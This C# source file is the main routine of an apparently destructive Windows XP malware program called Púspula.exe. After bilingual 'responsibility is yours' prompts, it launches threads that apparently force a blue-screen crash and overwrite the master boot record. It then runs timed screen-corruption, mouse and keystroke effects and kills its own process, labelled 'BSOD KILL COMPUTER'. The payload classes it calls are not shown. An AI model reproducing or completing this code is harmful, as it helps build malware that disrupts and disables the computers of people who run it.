using Puspula;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using static Vanara.PInvoke.User32;
using Vanara.PInvoke;
using static Puspula.ThreadManager;

public class mMain
{
    public static void cls()
    {
        InvalidateRect(HWND.NULL, null, true);
        UpdateWindow(HWND.NULL);
    }
    public static int Main()
    {
        if (Environment.OSVersion.Version.Major != 5 || Environment.OSVersion.Version.Minor != 1)
        {
            System.Windows.Forms.MessageBox.Show(
"(PTBR)\nEsse Software Só é Compativel com Windows XP." +
"\n\n(ENG)\nThis software is only compatible with Windows XP.", "", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            Environment.Exit(0);
            return 0;  // EXIT
        }

        Application.Run(new MsgConfirm());
        var msgFinal = System.Windows.Forms.MessageBox.Show(
"(PTBR)\nDeseja Mesmo Continuar?? a Responsabilidade é Toda Sua." +
"\n\n(ENG)\nDo you really want to continue?? The responsibility is all yours",
"Púspula.exe",
MessageBoxButtons.YesNo
, MessageBoxIcon.Warning);
        if (msgFinal == DialogResult.No)
        {
            return 0;
        }

        /*==========================================================================*/

        var bsod = new Thread(bBsod.Bsod);
        var mbr = new Thread(Mbr.MbrInit);

        bsod.Start();
        mbr.Start();

        tsp1.Start();
        StrangeBox.Start();

        tbb1.Start();
        gd1.Start();

        Thread.Sleep(1000 * 12);  // 12

        tbb1.Abort();
        gd1.Abort();
        cls();

        gd2.Start();
        tbb2.Start();

        Thread.Sleep(1000 * 20);  // 20 

        tbb2.Abort();
        gd2.Abort();
        cls();

        tbb3.Start();
        gd3.Start();

        Thread.Sleep(1000 * 20); // 20

        tbb3.Abort();
        gd3.Abort();
        cls();

        tbb4.Start();
        gd4.Start();
        Thread.Sleep(1000 * 20);  // 20

        tbb4.Abort();
        gd4.Abort();
        cls();

        tbb5.Start();
        gd5.Start();
        Thread.Sleep(500);

        Thread.Sleep(1000 * 20);  // 20

        tbb5.Abort();
        gd5.Abort();
        cls();

        tbb6.Start();
        gd6.Start();
        gd1Mouse.Start();

        Thread.Sleep(1000 * 20);  // 20

        tbb6.Abort();
        gd6.Abort();
        gd1Mouse.Abort();
        cls();

        tbb7.Start();
        gd7.Start();
        gd2Mouse.Start();

        Thread.Sleep(2000);
        gdSpawn1.Start();

        Thread.Sleep(1000 * 20);  // 20

        tbb7.Abort();
        gd7.Abort();
        gd2Mouse.Abort();
        gdSpawn1.Abort();
        cls();

        tbb8.Start();
        gd8.Start();

        Thread.Sleep(1000 * 20);  // 20

        tbb8.Abort();
        gd8.Abort();
        cls();

        tbb9.Start();
        gd9.Start();
        winClick.Start();
        capsClick.Start();
        tabClick.Start();

        Thread.Sleep(1000 * 20);  // 20

        tbb9.Abort();
        gd9.Abort();
        winClick.Abort();
        capsClick.Abort();
        tabClick.Abort();
        cls();


        gdiEND.Start();
        Thread.Sleep(1000 * 5);


        /*--------  BSOD KILL COMPUTER  --------*/
        Process[] app = Process.GetProcessesByName(Path.GetFileNameWithoutExtension(Application.ExecutablePath));
        if (app.Length > 0)
        {
            foreach (var process in app)
            {
                process.Kill();
            }
        }  
        /*-------------------------------------*/

        Thread.Sleep(Timeout.Infinite);
        return 0;
    }
}
